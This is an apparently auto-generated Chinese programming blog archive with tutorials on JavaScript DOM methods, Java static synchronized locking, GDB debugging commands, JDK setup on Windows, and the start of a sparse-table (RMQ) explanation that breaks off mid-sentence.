<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">closeWin</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line">            myWindow.close()</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">        myWindow = <span class="built_in">window</span>.open(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'width=200,height=100'</span>)</span></span><br><span class="line"><span class="actionscript">        myWindow.document.write(<span class="string">"This is 'myWindow'"</span>)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"Close 'myWindow'"</span> <span class="attr">onclick</span>=<span class="string">"closeWin()"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然了，如果想要通过打开一个窗口的方式来打开一个链接URL，是不推荐的，因为有些浏览器为了安全起见，可能会阻止windows.open()打开一个URL。</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200315/upP0Jok6i6zX.png" alt></p>
</li>
</ul>
<h2 id="js对象控制HTML元素"><a href="#js对象控制HTML元素" class="headerlink" title="js对象控制HTML元素"></a>js对象控制HTML元素</h2><p>想要要控制元素，首先就要先得到，或者说找到该元素，通过以下不同的几个不同的方法，可以得到或者控制HTML元素。</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>方法描述</th>
</tr>
</thead>
<tbody><tr>
<td>document.getElementsByTagName()</td>
<td>返回带有指定标签名的对象的集合。</td>
</tr>
<tr>
<td>document.getElementById()</td>
<td>返回对拥有指定 ID 的第一个对象的引用。</td>
</tr>
<tr>
<td>document.getElementsByName()</td>
<td>返回带有指定名称的对象的集合。</td>
</tr>
<tr>
<td>node_name.getAttribute()</td>
<td>返回指定属性名的属性值。</td>
</tr>
<tr>
<td>node_name.setAttribute()</td>
<td>添加指定的属性，并为其赋指定的值。<br>如果这个指定的属性已存在，则仅设置/更改值。</td>
</tr>
<tr>
<td>node_name.childNodes</td>
<td>返回节点的子节点集合，以 NodeList 对象。</td>
</tr>
<tr>
<td>node_name.parentNode</td>
<td>以 Node 对象的形式返回指定节点的父节点</td>
</tr>
<tr>
<td>document.createElement()</td>
<td>通过指定名称创建一个元素</td>
</tr>
<tr>
<td>node_name.removeChild()</td>
<td>删除当前节点下的特定子节点</td>
</tr>
</tbody></table>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"a_id"</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span> <span class="attr">id</span>=<span class="string">"p_5"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">name</span>=<span class="string">"p_name"</span>&gt;</span>6<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> p_count = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> n_count = <span class="built_in">document</span>.getElementsByName(<span class="string">"p_name"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// print:HTMLCollection(4)</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(p_count);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//通过下标访问集合中的元素</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(n_count[<span class="number">1</span>].innerHTML);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 通过id得到元素</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">"a_id"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 查找元素的属性</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(a.getAttribute(<span class="string">"href"</span>));</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 设置新的属性值</span></span></span><br><span class="line"><span class="actionscript">            a.setAttribute(<span class="string">"href"</span>, <span class="string">"https://yalexin.gitee.io/guestbook/"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">"div"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 得到子节点集合</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> child_list = div.childNodes;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> p = <span class="built_in">document</span>.getElementById(<span class="string">"p_5"</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//得到父节点（只有一个）</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> parent = p.parentNode;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> body = <span class="built_in">document</span>.body;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//创建一个输入框节点</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> input = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span></span><br><span class="line"><span class="actionscript">            input.type = <span class="string">"text"</span>;</span></span><br><span class="line"><span class="actionscript">            input.placeholder = <span class="string">"这是通过createElement方法创建的"</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 将input添加到body中（在末尾）</span></span></span><br><span class="line">            body.appendChild(input);</span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> p_insert = <span class="built_in">document</span>.createElement(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="actionscript">            p_insert.innerHTML = <span class="string">"这是通过insert方法插入的"</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 将p_insert节点插入到p节点之前（id = p_5）</span></span></span><br><span class="line">            div.insertBefore(p_insert, p);</span><br><span class="line"><span class="actionscript">            <span class="comment">// 删除div的子节点p（id = p_5）</span></span></span><br><span class="line">            div.removeChild(p);</span><br><span class="line">        &#125;</span><br><span class="line">        demo();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>JavaScript基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中给静态方法添加synchronized时候的锁</title>
    <url>/2020/10/29/Java%E4%B8%AD%E7%BB%99%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E6%B7%BB%E5%8A%A0synchronized%E6%97%B6%E5%80%99%E7%9A%84%E9%94%81/</url>
    <content><![CDATA[<p>在<code>java</code>静态方法上面加<code>synchronized</code>的时候，是把当前类的<code>Class</code>类对象进行持锁。例如下面的例子：</p>
<p><code>Service.java</code>：分别提供两个静态方法和一个非静态方法<a id="more"></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：Yalexin</span></span><br><span class="line"><span class="comment"> * Email： 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 进入 printA()"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 退出 printA()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 进入 printB()"</span>);</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 退出 printB()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 进入 printC()"</span>);</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 退出 printC()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>线程A调用静态方法A</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：Yalexin</span></span><br><span class="line"><span class="comment"> * Email： 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadA</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadA</span><span class="params">(Service service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Service service;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        service.printA();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>线程B调用静态方法B</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：Yalexin</span></span><br><span class="line"><span class="comment"> * Email： 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadB</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadB</span><span class="params">(Service service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Service service;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        service.printB();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进程C调用非静态方法C</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：Yalexin</span></span><br><span class="line"><span class="comment"> * Email： 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadC</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadC</span><span class="params">(Service service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Service service;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        service.printC();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">thread name = AAAA 在 <span class="number">1603940400153</span> 进入 printA()</span><br><span class="line">thread name = CCCC 在 <span class="number">1603940400153</span> 进入 printC()</span><br><span class="line">thread name = CCCC 在 <span class="number">1603940400153</span> 退出 printC()</span><br><span class="line">thread name = AAAA 在 <span class="number">1603940402169</span> 退出 printA()</span><br><span class="line">thread name = BBBB 在 <span class="number">1603940402169</span> 进入 printB()</span><br><span class="line">thread name = BBBB 在 <span class="number">1603940402169</span> 退出 printB()</span><br></pre></td></tr></table></figure>

<p>可以看到</p>
<p>A方法和B方法是同步的，是因为<code>synchronized</code>关键字加到静态方法上面的时候，是将<code>Service</code>类的<code>Class</code>类对象作为锁，而C方法和A或者B方法是异步的，是因为<code>synchronized</code>关键字加到非静态方法上面的时候，是将<code>Service</code>类的实例化对象作为锁，即C方法的锁和A或B的锁是两个不同的锁，二者可以异步进行。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下使用GDB调试C程序</title>
    <url>/2020/04/15/Linux%E4%B8%8B%E4%BD%BF%E7%94%A8GDB%E8%B0%83%E8%AF%95C%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p>在Windows上利用vs code等IDE（虽然是vs code不能算得上IDE）是很方便进行程序的调试，但是在没有图形界面的Linux环境下如何进行调试？答案就是借助<code>GDB</code>类似的调试器。</p>
<blockquote>
<p>文章摘录自<a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/" target="_blank" rel="noopener">linux tools quick tutoril</a>中的<a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html" target="_blank" rel="noopener">gdb调试利器</a></p>
</blockquote>
<a id="more"></a>GDB是一个由GNU开源组织发布的、UNIX/LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。

<p>对于一名Linux下工作的c++程序员，gdb是必不可少的工具；</p>
<p>有些系统没有默认安装，需要自己安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install gdb</span><br></pre></td></tr></table></figure>

<p>例如，有一个c程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对C/C++程序的调试，需要在编译前就加上-g选项:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gcc -g hello.c -o hello  # C++程序使用g++</span><br></pre></td></tr></table></figure>

<p>调试可执行文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$gdb hello</span><br></pre></td></tr></table></figure>

<p>然后进入交互界面，通过下面的命令进行调试：</p>
<p>运行类命令：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>run，简写r</td>
<td>运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。</td>
</tr>
<tr>
<td>continue 简写c</td>
<td>继续执行，到下一个断点处（或运行结束）</td>
</tr>
<tr>
<td>step 简写s</td>
<td>单步调试如果有函数调用，则进入函数；</td>
</tr>
<tr>
<td>next 简写n</td>
<td>单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内</td>
</tr>
<tr>
<td>until</td>
<td>当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体</td>
</tr>
<tr>
<td>until+行号</td>
<td>运行至某行，不仅仅用来跳出循环</td>
</tr>
<tr>
<td>finish</td>
<td>运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。</td>
</tr>
<tr>
<td>call 函数(参数)</td>
<td>调用程序中可见的函数，并传递“参数”，如：call gdb_test(55)</td>
</tr>
<tr>
<td>quit简写q</td>
<td>推出gdb交互界面</td>
</tr>
</tbody></table>
<p>设置断点类：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>break n 简写 b n</td>
<td>在程序的第n行设置断点</td>
</tr>
<tr>
<td>b  n if conditions</td>
<td>满足conditions条件时候在第n行设置断点</td>
</tr>
<tr>
<td>b functionName</td>
<td>在函数functionName()的入口处设置断点</td>
</tr>
<tr>
<td>delete n</td>
<td>删除第n个断点</td>
</tr>
<tr>
<td>clear n</td>
<td>清除第n行的断点 注意和delete的区别，删除函数的入口断点也是使用该命令</td>
</tr>
<tr>
<td>disable n</td>
<td>暂停第n个断点</td>
</tr>
<tr>
<td>enable n</td>
<td>开启第n个断点</td>
</tr>
<tr>
<td>info b</td>
<td>显示当前程序的断点设置情况</td>
</tr>
<tr>
<td>delete breakpoints</td>
<td>清除所有断点</td>
</tr>
</tbody></table>
<p>查看源代码类：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>list 简写l</td>
<td>列出程序的源代码，默认每次显示10行。<br>再次输入则将从上次输出的位置开始输出<br><strong>注意：</strong>生成可执行程序的时候如果没有加上<code>-g</code>选项的话，该命令是不能够执行的</td>
</tr>
<tr>
<td>list n</td>
<td>将显示当前文件以第n行为中心的前后10行代码，如：list 5</td>
</tr>
<tr>
<td>list functionName</td>
<td>将显示“函数名”所在函数的源代码，如：list main   或者 list test</td>
</tr>
</tbody></table>
<p>打印表达式类：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>print 表达式</td>
<td>表达式可以是程序中的变量，也可以是自己定义的表达式，如<br><code>print 2 * 2</code>，类似于C语言的<code>printf</code>函数</td>
</tr>
<tr>
<td>print func_name(p1,p1,…)</td>
<td>例如，调用求和函数并且打印结果<code>print sum(1,2,3)</code></td>
</tr>
<tr>
<td>display 表达式</td>
<td>单步运行时每执行一步都打印表示式的内容。</td>
</tr>
<tr>
<td>info locals</td>
<td>显示当前堆栈页的所有变量</td>
</tr>
</tbody></table>
<p>查询运行信息</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>where/bt</td>
<td>当前运行的堆栈列表</td>
</tr>
<tr>
<td>bt backtrace</td>
<td>显示当前调用堆栈</td>
</tr>
<tr>
<td>up/down</td>
<td>改变堆栈显示的深度</td>
</tr>
<tr>
<td>set args 参数</td>
<td>指定运行时的参数</td>
</tr>
<tr>
<td>show args</td>
<td>查看设置好的参数</td>
</tr>
<tr>
<td>info program</td>
<td>来查看程序的是否在运行，进程号，被暂停的原因。</td>
</tr>
</tbody></table>
<p>分割窗口</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>layout</td>
<td>用于分割窗口，可以一边查看代码，一边测试</td>
</tr>
<tr>
<td>layout src</td>
<td>显示源代码窗口</td>
</tr>
<tr>
<td>layout asm</td>
<td>显示反汇编窗口</td>
</tr>
<tr>
<td>layout regs</td>
<td>显示源代码/反汇编和CPU寄存器窗口</td>
</tr>
<tr>
<td>layout split</td>
<td>显示源代码和反汇编窗口</td>
</tr>
<tr>
<td>Ctrl + L</td>
<td>刷新窗口</td>
</tr>
</tbody></table>
<p>*<em>交互模式下直接回车的作用是重复上一指令，对于单步调试非常方便； *</em></p>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>命令行</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的环境配置（Windows系统）</title>
    <url>/2020/04/07/Java%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%88Windows%E7%B3%BB%E7%BB%9F%EF%BC%89/</url>
    <content><![CDATA[<h2 id="下载安装jdk"><a href="#下载安装jdk" class="headerlink" title="下载安装jdk"></a>下载安装jdk</h2><p><a href="https://www.oracle.com/java/technologies/javase-downloads.html" target="_blank" rel="noopener">甲骨文官网</a></p>
<p>从甲骨文下载好后，安装过程把安装的路径记住，或者更改到自己喜欢的路径。</p>
<h2 id="新建系统变量"><a href="#新建系统变量" class="headerlink" title="新建系统变量"></a>新建系统变量</h2><p>右击“此电脑”，依次点击“属性”，“高级系统设置”，“环境变量”，在“系统变量”处新建以下变量：<a id="more"></a></p>
<table>
<thead>
<tr>
<th>变量名</th>
<th>变量值</th>
</tr>
</thead>
<tbody><tr>
<td>JAVA_HOME</td>
<td>jdk的位置，如<code>D:\Java\jdk-14</code></td>
</tr>
<tr>
<td>CLASSPATH</td>
<td><code>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</code></td>
</tr>
</tbody></table>
<p> <strong>jdk1.5版本以上不需要设置<code>CLASSPATH</code>变量</strong></p>
<p>如果在<code>jdk</code>安装目录下没有<code>jre</code>的文件下，只要在命令行模式下进入该<code>jdk</code>的安装目录，输入下面的命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bin\jlink.exe --module-path jmods --add-modules java.desktop --output jre</span><br></pre></td></tr></table></figure>

<p>就可以生成了<code>jre</code>的相关文件了。</p>
<p>然后在<code>path</code>变量中添加两条变量值：</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586233918848.png" alt="1586233918848"></p>
<p>并且<code>%JAVA_HOME%\bin</code>必须在前面，否则可能出现下面这种错误：</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586234001560.png" alt="1586234001560"></p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>在命令行中输入下面的命令，能正常显示版本号就说明环境配置成功了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>RMQ问题之ST表</title>
    <url>/2021/04/28/RMQ%E9%97%AE%E9%A2%98%E4%B9%8BST%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>ST</code>表和线段树类似，用于快速求解区间问题，二者的建立时间都是<code>O(nlogn)</code>，但是<code>ST</code>表查询的时间达到了<code>O(1)</code>，虽然说不支持区间更新，线段树支持更新，更新花费时间<code>O(logn)</code>，查询花费<code>O(logn)</code><a id="more"></a></p>
<h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ul>
<li><code>RMQ</code>:<code>Range Minimum/Maximum Query</code>， 中文为区间最值查询 。</li>
<li>可重复贡献问题：官方术语解释起来不好解释，举个例子：假如我需要求前面<code>8</code>个数字的最值，我可以先求这<code>8</code>个数字中偏前面的<code>6</code>个中的最值<code>number1</code>，然后再求这<code>8</code>个数字中偏后面的最值<code>number2</code>，然后求<code>number1</code>和<code>number2</code>中二者最优者即可，这个过程你会发现中间的几个数字被重复计算了。</li>
<li><code>ST</code>表：一种数据结构，英文名为<code>Sparse Table</code>，即稀疏表。</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h3><p><code>ST</code>表应用了倍增以及动态规划的思想。</p>
<p>以求给定序列<code>number[]</code>的最大值为例：</p>
<p>定义<code>f[i][j]</code>为区间<code>[i, 2^j - 1]</code>内的最大值（即包括<code>number[i]</code>），特别的，<code>f[i][0]=number[i]</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i					   							i + 2 ^ j - 1</span><br><span class="line">|------------------------------------------------|</span><br></pre></td></tr></table></figure>

<p>对于上述区间，长度为<code>2^(j)</code>，为了求<code>f[i][j]</code>，我们可以先求前半段的最大值，再求后半段的最大值，然后取二者中较大者。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i					   							i + 2 ^ j - 1</span><br><span class="line">|------------------------------------------------|</span><br><span class="line">i          		i+2^(j-1)-1    i+2^(j-1) 			i + 2 ^ j - 1</span><br><span class="line">|--------------------------|   |----------------------|</span><br></pre></td></tr></table></figure>

<p>即状态转移方程为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[i][j] &#x3D; max(f[i][j - 1], f[i + (1 &lt;&lt; (j - 1))][j - 1])</span><br></pre></td></tr></table></figure>

<h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p><code>ST</code>表构建后之后，我们还不能直接拿过来简单使用，因为根据<code>ST</code>表的定义我们可以知道，当需要求的区间长度是<code>2</code>的整数幂的时候，<code>f[][]</code>才为所需要的答案。例如我要求的是<code>left=3,right=8</code>的区间中的最大值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3        6</span><br><span class="line">|--------|</span><br><span class="line">3            8</span><br><span class="line">|------------|</span><br><span class="line">3                 10</span><br><span class="line">|-----------------|</span><br></pre></td></tr></table></figure>

<p>此时<code>f[3][2]</code>代表上面的区间，<code>f[3][3]</code>代表下面的区间，而我们要求的是中间的区间。</p>
<p>此时可重复贡献问题的优势就体现出来了。</p>
<p>我们可以把问题一般化，假设要求的是<code>[left,right]</code>的最大值，此时<code>log2(right - left)</code>不是整数，此时我们可以把所求的区间分为两个子区间（当然，这两个区间之间是有重叠的），如下图所示：</p>
<p><img src="https://qiniu.yalexin.top/ST%E8%A1%A8.png" alt></p>
<p><code>log2(len)</code>是对<code>len</code>取<code>2</code>对数并下取整，最上面的区间和最小面的区间长度都是<code>2</code>的次幂，可以很方便地分别使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[left][x]</span><br><span class="line">f[right - 2^x + 1][x]</span><br></pre></td></tr></table></figure>

<p>来表示，其中<code>x=log2(right - left + 1)</code>并向下取整（加<code>1</code>应该很好理解）,此时中间所要求的区间即：</p>
